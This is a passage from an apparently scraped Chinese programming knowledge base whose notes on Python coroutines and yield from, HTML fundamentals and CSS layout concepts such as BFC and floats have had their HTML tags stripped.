e: print('执行完毕之后的值:', e.value) 运行结果 coroutine start coroutine received : 10 执行完毕之后的值: None 与JavaScript Generator类似，看一个例子 def simple_coroutine(x, y): z = yield x + y x = yield z * x y = yield x + y + z return y try: my_coro = simple_coroutine(5, 6) print(next(my_coro)) print(my_coro.send(30)) print(my_coro.send(8)) print(my_coro.send('Done')) except StopIteration as e: print('执行完毕之后的值:', e.value) 运行结果 11 150 44 执行完毕之后的值: (8, 'Done', 30) 当预激活传入x = 5,y =6时，第一次调用next()当遇到yield关键字，则交出函数的控制权，将yield后面的表达式计算出并返回给next(my_coro)中，所以当print(next(my_coro))的时候，值是x + y = 11， 第二步send(30)即恢复函数的执行权，并将30赋值给第一次交出函数控制权的地方，即 z = yield x + y处，此时send的值为30，则将z = 30简单讲就是将 yield x + y 替换成 传入的值30，所以z = 30 继续执行，此时x = 5,y = 6 z= 30遇到yield关键字，交出函数的控制权，并计算yield后面的表达式返回，此时表达式为z * x，当前z = 30, x = 5，所以计算出值为150 第三步，send(8) 恢复函数执行权，并将8赋值给上一次交出函数控制权的地方，将 8 赋值给 x ，此时x = 8,y = 6, z= 30，继续运行程序，当遇到yield x + y +z继续交出函数控制权，返回x + y + z表达式的值44 第四步，send('Done') 继续恢复函数执行权，将Done 赋值给上一次交出函数控制权的地方，将Done 赋值给y ，此时x = 8, y = 'Done', z = 30，继续执行，知道执行到return处，整个控制流程结束，Python抛出StopIteration异常，捕获异常可以得到return的值(8, 'Done', 30) 运行过程 协程的运行过程中有4个状态 GEN_CREATE:等待开始执行 GEN_RUNNING:解释器正在执行，这个状态一般看不到 GEN_SUSPENDED:在yield表达式处暂停 GEN_CLOSED:执行结束 通过导入from inspect import getgeneratorstate来获取协程状态 from inspect import getgeneratorstate def simple_coroutine(x, y): z = yield x + y x = yield z * x y = yield x + y + z return (x, y, z) try: my_coro = simple_coroutine(5, 6) print(getgeneratorstate(my_coro)) print(next(my_coro)) print(getgeneratorstate(my_coro)) print(my_coro.send(30)) print(my_coro.send(8)) print(my_coro.send('Done')) except StopIteration as e: print(getgeneratorstate(my_coro)) print('执行完毕之后的值:', e.value) 运行结果 GEN_CREATED 11 GEN_SUSPENDED 150 44 GEN_CLOSED 执行完毕之后的值: (8, 'Done', 30) 可以看到在未调用next()方法时，协程的状态为GUN_CREATED，在开始执行的时候协程的状态为GEN_SUSPENDED,最后执行完毕之后状态为GEN_CLOSED 预激协程的装饰器 from functools import wraps def coroutine(func): @wraps(func) def prime(*args, **kwargs): gen = func(*args, **kwargs) print(next(gen)) return gen return prime @coroutine def simple_coroutine(x, y): z = yield x + y x = yield z * x y = yield x + y + z return (x, y, z) try: coro_arg = simple_coroutine(5, 6) print(coro_arg.send(30)) print(coro_arg.send(8)) coro_arg.send(None) except StopIteration as e: print(e.value) 关于预激，在使用yield from句法调用协程的时候，会自动预激活，这样其实与我们上面定义的coroutine装饰器是不兼容的，在python3.4里面的asyncio.coroutine装饰器不会预激协程，因此兼容yield from 关于yield from yield from 是在Python3.3才出现的语法。所以这个特性在Python2中是没有的 yield from 后面需要加的是可迭代对象，它可以是普通的可迭代对象，也可以是迭代器，甚至是生成器。 简单应用：拼接可迭代对象 使用yield和使用yield from的例子来对比 myStr = 'abc' myList = [1, 2, 3] mydict = {'name': 'aaron', 'age': '21'} mygen = (i for i in range(4, 9)) def gen(*args): for item in args: for i in item: yield i newList = gen(myStr, myList, mydict, mygen) print(list(newList)) # ['a', 'b', 'c', 1, 2, 3, 'name', 'age', 4, 5, 6, 7, 8] myStr = 'abc' myList = [1, 2, 3] mydict = {'name': 'aaron', 'age': '21'} mygen = (i for i in range(4, 9)) def gen(*args): for item in args: yield from item newList = gen(myStr, myList, mydict, mygen) print(list(newList)) # ['a', 'b', 'c', 1, 2, 3, 'name', 'age', 4, 5, 6, 7, 8] 由上面两种方式对比，可以看出，yield from后面加上可迭代对象，他可以把可迭代对象里的每个元素一个一个的yield出来，对比yield来说代码更加简洁，结构更加清晰 复杂应用：生成器的嵌套 当 yield from 后面加上一个生成器后，就实现了生成的嵌套。 当然实现生成器的嵌套，并不是一定必须要使用yield from，而是使用yield from可以让我们避免让我们自己处理各种料想不到的异常，而让我们专注于业务代码的实现。 调用方：调用委派生成器的客户端（调用方）代码 委托生成器： 包含yield from表达式的生成器函数 子生成器： yield from后面加的生成器函数 # 委托生成器 def gen(): while True: yield from averger_gen() # 子生成器 def averger_gen(): total = 0 count = 0 averger = 0 while True: averger = yield averger total += averger count += 1 averger = total / count gen = gen() next(gen) print(gen.send(10)) print(gen.send(20)) print(gen.send(30)) 委托生成器的作用是：在调用方与子生成器之间建立一个双向通道。 调用方可以通过send()直接发送消息给子生成器，而子生成器yield的值，也是直接返回给调用方 委托生成器，只起一个桥梁作用，它建立的是一个双向通道，它并没有权利也没有办法，对子生成器yield回来的内容做拦截。 # 委托生成器 def gen(): while True: # 只有子生成器要结束（return）了，yield from左边的变量才会被赋值，后面的代码才会执行。 total, count, averger = yield from averger_gen() print('计算完成！总共计算：{}个，总和：{}分，平均分：{}'.format(count, total, averger)) # 子生成器 def averger_gen(): total = 0 count = 0 averger = 0 while True: term = yield averger if term is None: break total += term count += 1 averger = total / count # 每一次return，都意味着当前协程结束。 return total, count, averger gen = gen() next(gen) print(gen.send(10)) print(gen.send(20)) print(gen.send(30)) gen.send(None) # 结束协程 运行结果 10.0 15.0 20.0 计算完成！总共计算：3个，总和：60分，平均分：20.0 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-27 20:50:00 "},"知识库/04.编程开发/03.Web前端/00.前端基础/01.HTML/":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/01.HTML/","title":"01.HTML","keywords":"","body":"HTML 什么是HTML HTML是一种描述网页的一种语言 HTML 指的是超文本标记语言 (Hyper Text Markup Language) HTML 不是一种编程语言，而是一种标记语言 (markup language) 标记语言是一套标记标签 (markup tag) HTML 使用标记标签来描述网页 HTML 标签 HTML 标记标签通常被称为 HTML 标签 (HTML tag)。 HTML 标签是由尖括号包围的关键词，比如 HTML 标签通常是成对出现的，比如 和 标签对中的第一个标签是开始标签，第二个标签是结束标签 开始和结束标签也被称为开放标签和闭合标签 HTML 文档 = 网页 HTML 文档描述网页 HTML 文档包含 HTML 标签和纯文本 HTML 文档也被称为网页 Web 浏览器的作用是读取 HTML 文档，并以网页的形式显示出它们。浏览器不会显示 HTML 标签，而是使用标签来解释页面的内容： 我的第一个标题 我的第一个段落。 HTML 元素 HTML 元素指的是从开始标签（start tag）到结束标签（end tag）的所有代码 开始标签 元素内容 结束标签 This is a paragraph This is a link 注释：开始标签常被称为开放标签（opening tag），结束标签常称为闭合标签（closing tag） 元素语法 HTML 元素以开始标签起始 HTML 元素以结束标签终止 元素的内容是开始标签与结束标签之间的内容 某些 HTML 元素具有空内容（empty content） 空元素在开始标签中进行关闭（以开始标签的结束而结束） 大多数 HTML 元素可拥有属性 嵌套的 HTML 元素 大多数 HTML 元素可以嵌套（可以包含其他 HTML 元素） HTML 文档由嵌套的 HTML 元素构成 HTML文档实例 This is my first paragraph. 上面的例子包含三个 HTML 元素。 HTML实例解释 元素： This is my first paragraph. 这个元素定义了 HTML 文档中的一个段落。 这个元素拥有一个开始标签，以及一个结束标签。 元素内容是：This is my first paragraph 元素： This is my first paragraph. 元素定义了 HTML 文档的主体。 这个元素拥有一个开始标签 ，以及一个结束标签。 元素内容是另一个 HTML 元素（p 元素）。 元素： This is my first paragraph. 元素定义了整个 HTML 文档。 这个元素拥有一个开始标签，以及一个结束标签 。 元素内容是另一个 HTML 元素（body 元素）。 [!TIP] 不要忘记结束标签 即使您忘记了使用结束标签，大多数浏览器也会正确地显示 HTML： This is a paragraph This is a paragraph 上面的例子在大多数浏览器中都没问题，但不要依赖这种做法。忘记使用结束标签会产生不可预料的结果或错误。 注释：未来的 HTML 版本不允许省略结束标签。 空的 HTML 元素 没有内容的 HTML 元素被称为空元素。空元素是在开始标签中关闭的。 就是没有关闭标签的空元素（ 标签定义换行）。 在 XHTML、XML 以及未来版本的 HTML 中，所有元素都必须被关闭。 在开始标签中添加斜杠，比如，是关闭空元素的正确方法，HTML、XHTML 和 XML 都接受这种方式。 即使 在所有浏览器中都是有效的，但使用 其实是更长远的保障。 [!TIP] HTML 标签对大小写不敏感： 等同于 。许多网站都使用大写的 HTML 标签。 W3School 使用的是小写标签，因为万维网联盟（W3C）在 HTML 4 中推荐使用小写，而在未来 (X)HTML 版本中强制使用小写 HTML 属性 [!TIP] HTML 提示：使用小写属性；属性和属性值对大小写不敏感。不过，万维网联盟在其 HTML 4 推荐标准中推荐小写的属性/属性值。而新版本的 (X)HTML 要求使用小写属性。 属性值应该始终被包括在引号内。双引号是最常用的，不过使用单引号也没有问题。在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号 name='Bill \"HelloWorld\" Gates' 下面列出了适用于大多数 HTML 元素的属性： 属性 值 描述 class classname 规定元素的类名（classname） id id 规定元素的唯一 id style style_definition 规定元素的行内样式（inline style） title text 规定元素的额外信息（可在工具提示中显示） 如需更多关于标准属性的信息，请访问： HTML 标准属性参考手册 块元素和内联元素 块级元素”译为 block level element，“内联元素”译为 inline element。 块级元素在浏览器显示时，通常会以新行来开始（和结束）。 比如：,,, 内联元素在显示时通常不会以新行开始。 例子：,,, div 元素是块级元素，它是可用于组合其他 HTML 元素的容器。 元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。 如果与 CSS 一同使用， 元素可用于对大的内容块设置样式属性。 元素的另一个常见的用途是文档布局。它取代了使用表格定义布局的老式方法。使用 元素进行文档布局不是表格的正确用法。 元素的作用是显示表格化的数据。 span 元素是内联元素，可用作文本的容器。 元素也没有特定的含义。 当与 CSS 一同使用时，元素可用于为部分文本设置样式属性。 class 对 HTML 进行分类（设置类），使我们能够为元素的类定义 CSS 样式。 为相同的类设置相同的样式，或者为不同的类设置不同的样式。 类的写法是在css中使用.来标记这一类标签 .cities { background-color:black; color:white; margin:20px; padding:20px; } London London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants. Standing on the River Thames, London has been a major settlement for two millennia, its history going back to its founding by the Romans, who named it Londinium. 分类块级元素 元素是块级元素。它能够用作其他 HTML 元素的容器。 设置 元素的类，使我们能够为相同的元素设置相同的类 .cities { background-color:black; color:white; margin:20px; padding:20px; } London London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants. Paris Paris is the capital and most populous city of France. Tokyo Tokyo is the capital of Japan, the center of the Greater Tokyo Area, and the most populous metropolitan area in the world. 分类行内元素 HTML 元素是行内元素，能够用作文本的容器。 设置 元素的类，能够为相同的 元素设置相同的样式。 span.red {color:red;} My Important Heading id HTMLid 属性用于 为HTML 元素指定唯一的 id。 一个 HTML文档中不能存在多个有相同 id 的元素。 id 属性指定 HTML 元素的唯一 ID。 id 属性的值在 HTML 文档中必须是唯一的。 id 属性用于指向样式表中的特定样式声明。JavaScript 也可使用它来访问和操作拥有特定 ID 的元素。 id 的语法是：写一个井号 (#)，后跟一个 id 名称。然后，在花括号 {} 中定义 CSS 属性。 下面的例子中我们有一个 元素，它指向 id 名称 \"myHeader\"。这个 元素将根据 head 部分中的 #myHeader 样式定义进行样式设置： #myHeader { background-color: lightblue; color: black; padding: 40px; text-align: center; } My Header [!TIP] Class 与 ID 的差异: 同一个类名可以由多个 HTML 元素使用，而一个 id 名称只能由页面中的一个 HTML 元素使用 通过 ID 和链接实现 HTML 书签(锚点) HTML 书签用于让读者跳转至网页的特定部分。如果页面很长，那么书签可能很有用。要使用书签，您必须首先创建它，然后为它添加链接。然后，当单击链接时，页面将滚动到带有书签的位置。 首先，用 id 属性创建书签： 第四章 然后，在同一张页面中，向这个书签添加一个链接（“跳转到第四章”） 跳转到第四章 或者，在另一张页面中，添加指向这个书签的链接（“跳转到第四章”）： Jump to Chapter 4 JavaScript 中使用 id 属性 JavaScript 也可以使用 id 属性为特定元素执行某些任务。 JavaScript 可以使用 getElementById() 方法访问拥有特定 id 的元素： 示例 使用 id 属性通过 JavaScript 来处理文本 function displayResult() { document.getElementById(\"myHeader\").innerHTML = \"Have a nice day!\"; } 更多参考W3School Doctype作用？标准模式与兼容模式各有什么区别? DOCTYPE 是用来声明文档类型和 DTD 规范的。 声明位于 HTML 文档中的第一行，不是一个 HTML 标签，处于 html 标签之前。告知浏览器的解析器用什么文档标准解析这个文档。DOCTYPE 不存在或格式不正确会导致文档以兼容模式呈现。 标准模式的排版 和 JS 运作模式都是以该浏览器支持的最高标准运行。在兼容模式中，页面以宽松的向后兼容的方式显示,模拟老式浏览器的行为以防止站点无法工作。 在 HTML4.01 中声明指向一个 DTD，由于 HTML4.01 基于 SGML，所以 DTD 指定了标记规则以保证浏览器正确渲染内容 HTML5 不基于 SGML，所以不用指定 DTD HTML 全局属性 全局属性是所有 HTML 元素共有的属性; 它们可以用于所有元素，即使属性可能对某些元素不起作用。 全局属性 | MDN canvas 和 svg 的区别 canvas 是 html5 提供的新元素，而svg存在的历史要比canvas久远，已经有十几年了。svg并不是 html5 专有的标签，最初 svg 是用xml 技术（超文本扩展语言，可以自定义标签或属性）描述二维图形的语言。在 H5 中看似 canvas 与svg 很像，但是，他们有巨大的差别。 首先，从它们的功能上来讲，canvas可以看做是一个画布。，其绘制出来的图形为标量图，因此，可以在 canvas中引入jpg或png 这类格式的图片，在实际开发中，大型的网络游戏都是用canvas画布做出来的，并且canvas的技术现在已经相当的成熟。另外，我们喜欢用 canvas来做一些统计用的图表，如柱状图曲线图或饼状图等。 而 svg，所绘制的图形为矢量图，所以其用法上受到了限制。因为只能绘制矢量图，所以svg 中不能引入普通的图片，因为矢量图的不会失真的效果，在项目中我们会用来做小图标。但是由于其本质为矢量图，可以被无限放大而不会失真，这很适合被用来做地图，而百度地图就是用svg 技术做出来的。 另外从技术发面来讲 canvas 里面绘制的图形不能被引擎抓取，如我们要让 canvas 里面的一个图片跟随鼠标事件: canvas.onmouseover=function(){}。 而 svg 里面的图形可以被引擎抓取，支持事件的绑定。另外 canvas 中我们绘制图形通常是通过javascript 来实现，svg 更多的是通过标签来来实现，如在 svg 中绘制正矩形形就要用，这里我们不能用属性 style=\"width:XXX;height:XXX;\"来定义。 行内元素有哪些？块级元素有哪些？ 空(void)元素有那些？ 定义：CSS 规范规定，每个元素都有 display 属性，确定该元素的类型，每个元素都有默认的 display 值，如 div 的 display 默认值为“block”，则为“块级”元素；span 默认 display 属性值为“inline”，是“行内”元素 行内元素有：a b span img input select strong（强调的语气） 块级元素有：div ul ol li dl dt dd h1 h2 h3 h4…p 空元素： 常见: br hr img input link meta 不常见: area base col command embed keygen param source track wb 不同浏览器（版本）、HTML4（5）、CSS2 等实际略有差异 参考: http://stackoverflow.com/questions/6867254/browsers-default-css-for-html-elements 页面导入样式时，使用 link 和@import 有什么区别？ link 属于 XHTML 标签，除了加载 CSS 外，还能用于定义 RSS, 定义 rel 连接属性等作用；而@import 是 CSS 提供的，只能用于加载 CSS; 页面被加载的时，link 会同时被加载，而@import 引用的 CSS 会等到页面被加载完再加载; import 是 CSS2.1 提出的，只在 IE5 以上才能被识别，而 link 是 XHTML 标签，无兼容问题; link 支持使用 js 控制 DOM 去改变样式，而@import 不支持; 浏览器内核 主要分成两部分：渲染引擎(layout engineer 或 Rendering Engine)和 JS 引擎。 渲染引擎：负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后渲染到用户的屏幕上。 JS 引擎则：解析和执行 javascript 来实现逻辑和控制 DOM 进行交互。 最开始渲染引擎和 JS 引擎并没有区分的很明确，后来 JS 引擎越来越独立，内核就倾向于只指渲染引擎。 HTML5 变化 新的语义化元素 header footer nav main article section 删除了一些纯样式的标签 表单增强 新 API 离线 （applicationCache ） 音视频 （audio, vidio） 图形 （canvans） 实时通信（websoket） 本地存储（localStorage, indexDB） 设备能力（地图定位，手机摇一摇） em 与 i 的区别 效果都是斜体 em 是语义化标签，表强调 i 是样式标签， 表斜体 哪些元素可以自闭合？ 表单元素 input img br, hr meta, link HTML 和 DOM 的关系 HTML 只是一个字符串 DOM 由 HTML 解析而来 JS 可以维护 DOM property 和 attribute 的区别 例如一个 input 标签 他的 attribute 是 3 但如果使用input.value = 4 或 直接修改值为 4，这时再去 getAttribute 得到的还是\"3\" form 作用 直接提交表单 使用 submit / reset 按钮 便于浏览器保存表单 第三方库可以整体取值 第三方库可以进行表单验证 主流浏览器机器内核 浏览器 内核 备注 IE Trident IE、猎豹安全、360 极速浏览器、百度浏览器 firefox Gecko Safari webkit 从 Safari 推出之时起，它的渲染引擎就是 Webkit，一提到 webkit，首先想到的便是 chrome，Webkit 的鼻祖其实是 Safari。 chrome Chromium/Blink 在 Chromium 项目中研发 Blink 渲染引擎（即浏览器核心），内置于 Chrome 浏览器之中。Blink 其实是 WebKit 的分支。大部分国产浏览器最新版都采用 Blink 内核。二次开发 Opera blink Opera 内核原为：Presto，现在跟随 chrome 用 blink 内核。 HTML 语义化 用正确的标签做正确的事情。 html 语义化让页面的内容结构化，结构更清晰，便于对浏览器、搜索引擎解析; 即使在没有样式 CSS 情况下也以一种文档格式显示，并且是容易阅读的; 搜索引擎的爬虫也依赖于 HTML 标记来确定上下文和各个关键字的权重，利于 SEO; 使阅读源代码的人对网站更容易将网站分块，便于阅读维护理解。 HTML中 title 属性和 alt 属性的区别 当图片不输出信息的时候，会显示 alt 信息 鼠标放上去没有信息，当图片正常读取，不会出现 alt 信息 当图片不输出信息的时候，会显示 alt 信息 鼠标放上去会出现 title 信息； 当图片正常输出的时候，不会出现 alt 信息，鼠标放上去会出现 title 信息。 除了纯装饰图片外都必须设置有意义的值，搜索引擎会分析。 其他部分title知识点 title 属性可以用在除了 base，basefont，head，html，meta，param，script 和 title 之外的所有标签。 title 属性的功能是提示。额外的说明信息和非本质的信息请使用 title 属性。title 属性值可以比 alt 属性值设置的更长。 title 属性有一个很好的用途，即为链接添加描述性文字，特别是当连接本身并不是十分清楚的表达了链接的目的。 table标签 table 的缺点在于服务器把代码加载到本地服务器的过程中，本来是加载一行执行一行，但是 table 标签是里面的东西全都下载完之后才会显示出来，那么如果图片很多的话就会导致网页一直加载不出来，除非所有的图片和内容都加载完。如果要等到所有的图片全都加载完之后才显示出来的话那也太慢了，所以 table 标签现在基本放弃使用了 head 元素 head 子元素大概分为三类，分别是 描述网页基本信息的 指向渲染网页需要其他文件链接的 各大厂商根据自己需要定制的 网页基本信息 一个网页，首先得有个标题，就跟人有名字一样。除此之外，还可以根据实际需要补充一些基本信息。 文档标题（浏览器标签中显示的文本）：深入了解 head 元素 编码格式： 如果你的页面出现乱码，那一般就是编码格式不对 视窗设置： 搜索引擎优化相关内容： IE 浏览器版本渲染设置： 其他文件链接 CSS 文件： JavaScript 文件： 但是为了让页面的样子更早的让用户看到，一般把 JS 文件放到 body 的底部 厂商定制 同样分享页面到 QQ 的聊天窗口，有些页面直接就是一个链接，但是有些页面有标题，图片，还有文字介绍。为什么区别这么明显呢？其实就是看有没有设置下面这三个内容 移动端项目需要注意的 4 个问题 meta 中设置 viewport 阻止用户手滑放大或缩小页面，需要在 index.html 中添加 meta 元素,设置 viewport。 CSS 样式统一问题 我们需要重置页面样式，因为在不同的手机浏览器上，默认的 css 样式不是统一的。 解决方法：使用 reset.css 重置所有元素的默认样式 一像素边框问题 有的手机分辨率比较高，是 2 倍屏或 3 倍屏，手机上的浏览器就会把 CSS 中的 1 像素值展示为 2 个或 3 个物理宽度 解决方法： 添加一个 border.css 库，将利用scroll 缩放的原理将边框重置。当我们需要使用一像素边框时只需要在标签上添加对应类名，如设置底部一像素边框就在标签上加入\"border-bottom\"的 class 名 300 毫秒点击延迟问题 在移动端开发中，某些机型上使用 click 事件会延迟 300ms 才执行，这样影响了用户体验。 解决方法： 引入fastclick.js。 Cookies，sessionStorage 和 localStorage 的区别 cookie 是网站为了标示用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密） cookie 数据始终在同源的 http 请求中携带（即使不需要），记会在浏览器和服务器间来回传递。 sessionStorage 和 localStorage 不会自动把数据发给服务器，仅在本地保存。 存储大小： cookie 数据大小不能超过 4k。 sessionStorage 和 localStorage 虽然也有存储大小的限制，但比 cookie 大得多，可以达到 5M 或更大。 有效期（生命周期）： localStorage: 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据； sessionStorage: 数据在当前浏览器窗口关闭后自动删除。 cookie: 设置的 cookie 过期时间之前一直有效，即使窗口或浏览器关闭 共享 sessionStorage 不能共享，localStorage 在同源文档之间共享，cookie 在同源且符合 path 规则的文档之间共享 参考链接 https://www.w3school.com.cn/html/html_jianjie.asp https://github.com/huyaocode/webKnowledge/tree/master/0-%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80/HTML Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 13:56:23 "},"知识库/04.编程开发/03.Web前端/00.前端基础/02.CSS/":{"url":"知识库/04.编程开发/03.Web前端/00.前端基础/02.CSS/","title":"02.CSS","keywords":"","body":"CSS Cascading Style Sheet 层叠样式表 CSS 选择器 标签选择 id 选择器 class 选择器 后代选择 （div a） 子代选择 （div > p） 相邻选择 （div + p） 通配符选择 （*） 否定选择器 :not(.link){} 属性选择器 伪类选择器 伪元素选择器 ::before{} CSS3 属性选择器 选择器 描述 [attribute] 用于选取带有指定属性的元素。 [attribute=value] 用于选取带有指定属性和值的元素。 [attribute~=value] 用于选取属性值中包含指定词汇的元素。 [attribute\\ =value] 用于选取带有以指定值开头的属性值的元素，该值必须是整个单词。 [attribute^=value] 匹配属性值以指定值开头的每个元素。 [attribute$=value] 匹配属性值以指定值结尾的每个元素。 [attribute*=value] 匹配属性值中包含指定值的每个元素。 CSS3 伪类选择器 伪类 | MDN 常用： :hover :focus :after 在元素之前添加内容,也可以用来做清除浮动。 :before 在元素之后添加内容 :enabled 选择器匹配每个已启用的元素（大多用在表单元素上）。 :disabled 控制表单控件的禁用状态。 :checked 单选框或复选框被选中 ::selection 用户选中的区域 :empty 一般用来隐藏内部什么都没有的元素 :not(selecter) p:first-of-type p:last-of-type p:only-of-type p:nth-of-type(n) p:nth-last-of-type(n) :nth-child(n) :nth-last-child(n) p:only-child 伪类和伪元素区别 伪类值一种状态 比如:hover 伪元素是一个真实存在的元素，他可以有样式有内容 iconfont 原理 利用编码让图标编为一个字符 引入字体 利用 before 伪元素向页面中插入一个文字 css 定义的权重 !important 优先级最高，但也会被权重高的 important 所覆盖 行内样式总会覆盖外部样式表的任何样式(除了!important) 单独使用一个选择器的时候，不能跨等级使 css 规则生效 如果两个权重不同的选择器作用在同一元素上，权重值高的 css 规则生效 如果两个相同权重的选择器作用在同一元素上：以后面出现的选择器为最后规则 权重相同时，与元素距离近的选择器生 一句话总结： !important > 行内样式 > ID 选择器 > (类选择器 | 属性选择器 | 伪类选择器 ) > 元素选择器 > * 浏览器解析 CSS .wrapper div > p CSS 中，浏览器查找元素是通过选择权从后往前找的， 这样做的目的是加快 CSS 解析速度，从后往前，排除法 浏览器解析 css 选择器的规则 怎样美化一个 checkbox ? 让原本的勾选框隐藏 input + label 背景图没选中 input:checked + label 背景图选中 .checkbox input { display: none; } .checkbox input + label { background: url(./没选中.png) left center no-repeat; background-size: 20px 20px; padding-left: 20px; } .checkbox input:checked + label { background-image: url(./选中.png); } 我很帅 盒模型 盒模型有两种， IE 怪异盒子模型、W3C 标准盒子模型； 盒模型是由： 内容(content)、内边距(padding)、边框(border)、外边距(margin) 组成的。 标准模型的宽高是指的 content 区宽高； IE 盒模型的宽高是指的 content+padding+border 的宽高。 CSS 如何设置这两种盒模型？ 标准盒模型： box-sizing: content-box; 怪异盒模型： box-sizing: border-box; BFC 什么是 BFC W3C 对 BFC 定义： [!TIP] 浮动元素和绝对定位元素，非块级盒子的块级容器（例如 inline-blocks, table-cells, 和 table-captions），以及 overflow 值不为“visiable”的块级盒子，都会为他们的内容创建新的 BFC（块级格式上下文）。 BFC(Block formatting context)直译为\"块级格式化上下文\"。它是一个独立的渲染区域，只有 Block-level box 参与， 它规定了内部的 Block-level Box 如何布局，并且与这个区域外部毫不相干。 BFC 作用： 利用 BFC 避免外边距折叠 清除内部浮动 （撑开高度） 原理: 触发父 div 的 BFC 属性，使下面的子 div 都处在父 div 的同一个 BFC 区域之内 避免文字环绕 分属于不同的 BFC 时，可以阻止 margin 重叠 多列布局中使用 BFC 如何生成 BFC：（脱离文档流，满足下列的任意一个或多个条件即可） 根元素，即 HTML 元素（最大的一个 BFC） float 的值不为 none position 的值为 absolute 或 fixed overflow 的值不为 visible（默认值。内容不会被修剪，会呈现在元素框之外） display 的值为 inline-block、table-cell、table-caption BFC 布局规则： 内部的 Box 会在垂直方向，一个接一个地放置。 属于同一个 BFC 的两个相邻的 Box 的 margin 会发生重叠 BFC 就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此, 文字环绕效果，设置 float BFC 的区域不会与 float box 重叠。 计算 BFC 的高度，浮动元素也参与计算 BFC、IFC、GFC 和 FFC BFC（Block formatting contexts）：块级格式上下文 IFC（Inline formatting contexts）：内联格式上下文 GFC（GrideLayout formatting contexts）：网格布局格式化上下文 FFC（Flex formatting contexts）:自适应格式上下文 非布局样式 字体、字重、颜色、大小、行高 背景、边框 滚动、换行 粗体、斜体、下划线 其他 行高的构成 行高是由 line-box 组成的 line-box 是由一行里的 inline-box 组成的 inline-box 中最高的那个，或字体最大的拿个决定行高 float 元素\"浮动\" 脱离文档流 不脱离文本流 位置尽量靠上，并靠左或右 对自己的影响 形成\"块\"(BFC) 这个块会负责自己的布局，宽高由自己决定 比如 span 中用 float 这个 span 就形成了一个 BFC，就可以设置宽高了 对兄弟元素的影响 上面一般贴非 float 元素 靠边贴 float 元素或边 不影响其他块级元素位置 影响其他块级元素文本 对父级元素的影响 从布局上\"消失\" 高度塌陷 清除浮动 浮动的元素布局时不会占据父元素的布局空间，即父元素布局时不会管浮动元素，浮动元素有可能超出父元素，从而对其他元素造成影响。 方法一：让父元素变为一个 BFC。 父元素 overflow: auto/hidden。 让父元素去关注里面的高度。 必须定义 width 或 zoom:1，同时不能定义 height，使用 overflow:auto 时，浏览器会自动检查浮动区域的高度 方法二： 使用伪元素清楚浮动 .container::after { content: \" \"; clear: both; display: block; visibility: hidden; height: 0; } inline-block 的间隙 两个并列的 inline-block 中间会有一条裂缝，这个的原因是两个标签之间有空格，浏览器把这些空格当成文字中空格，所以这两个块中间多少有间隙。 解决办法： 删除两个标签间的空格，但是这样 html 排版不好 容器元素 font-size: 0 然后再在里面再重新设置字体大小 line-height line-height 指一行字的高度，包含了字间距，实际上是下一行基线到上一行基线距离 如果一个标签没有定义 height 属性，那么其最终表现的高度是由 line-height 决定的 一个容器没有设置高度，那么撑开容器高度的是 line-height 而不是容器内的文字内容 把 line-height 值设置为 height 一样大小的值可以实现单行文字的垂直居中 line-height 和 height 都能撑开一个高度，height 会触发 haslayout（一个低版本 IE 的东西），而 line-height 不会 line-height 三种赋值方式有何区别？（带单位、纯数字、百分比) 带单位：px 是固定值，而 em 会参考父元素 font-size 值计算自身的行高 纯数字：会把比例传递给后代。例如，父级行高为 1.5，子元素字体为 18px，则子元素行高为 1.5 * 18 = 27px 百分比：将计算后的值传递给后代 边框 边框的属性： 线型、大小、颜色 边框背景图 边框衔接 滚动 visible 滚动条隐藏, 文字超出显示 hidden 滚动条隐藏, 文字超出不显示 scroll 滚动条一直显示，无论文字是否够多 auto 滚动条自动隐藏 文字折行 overflow-wrap(word-wrap)通用换行控制 是否保留单词 word-break 针对多字节文本文字 中文句子也是单词 white-space 空白处是否换行 装饰属性及其他 字重（粗体） font-weight 斜体 font-style: itatic 下划线 text-decoration 指针 cursor CSS Hack 在一部分不合法，但是在某些浏览器上生效的写法就叫 CSS Hack，一般用来兼容老的浏览器， 缺点是难理解、难维护、易失效 替代方案： 特征检测 针对性的加 class 比如第一步检测是 IE6，那么只需要添加一个专门的 class 名来兼容 IE6 就好 写 Hack 时需要注意 标准属性写在前面， hack 代码写在后面 单行文本溢出显示省略号 overflow: hidden; text-overflow: ellipsis; white-space: no-wrap; 多行文本溢出显示省略号 overflow: hidden; text-overflow: ellipsis; display: -webkit-box; -webkit-line-clamp: 3; -webkit-box-orient: vertical; div 中直接展示文字 div 中直接展示 textarea 的文字，要让文字不超出 DOM 边界，自动折行，而且保留原本在 textarea 中换行 div { white-space: pre-line; word-break: break-word; } display: none; 与 visibility: hidden; 的区别 结构： display:none 会让元素完全从渲染树中消失，渲染的时候不占据任何空间, 不能点击， visibility: hidden 不会让元素从渲染树消失，渲染元素继续占据空间，只是内容不可见，不能点击 opacity: 0 不会让元素从渲染树消失，渲染元素继续占据空间，只是内容不可见，可以点击 继承 display: none 和 opacity: 0 非继承属性，子孙节点消失由于元素从渲染树消失造成，通过修改子孙节点属性无法显示。 visibility: hidden 继承属性，子孙节点消失由于继承了 hidden，通过设置 visibility: visible;可以让子孙节点显式。 性能 display:none 修改元素会造成文档回流。读屏器不会读取 display: none 元素内容，性能消耗较大 visibility:hidden 修改元素只会造成本元素的重绘,性能消耗较少。读屏器读取 visibility: hidden 元素内容 opacity: 0 修改元素会造成重绘，性能消耗较少 相同点： 它们都能让元素不可见、他们都依然可以被 JS 所获取到 外边距折叠(collapsing margins) 外边距重叠就是margin-collapse 相邻的两个盒子（可能是兄弟关系也可能是祖先关系）的外边距可以结合成一个单独的外边距。 这种合并外边距的方式被称为折叠，结合而成的外边距称为折叠外边距 折叠结果遵循下列计算规则： 两个相邻的外边距都是正数时，折叠结果是它们两者之间较大的值 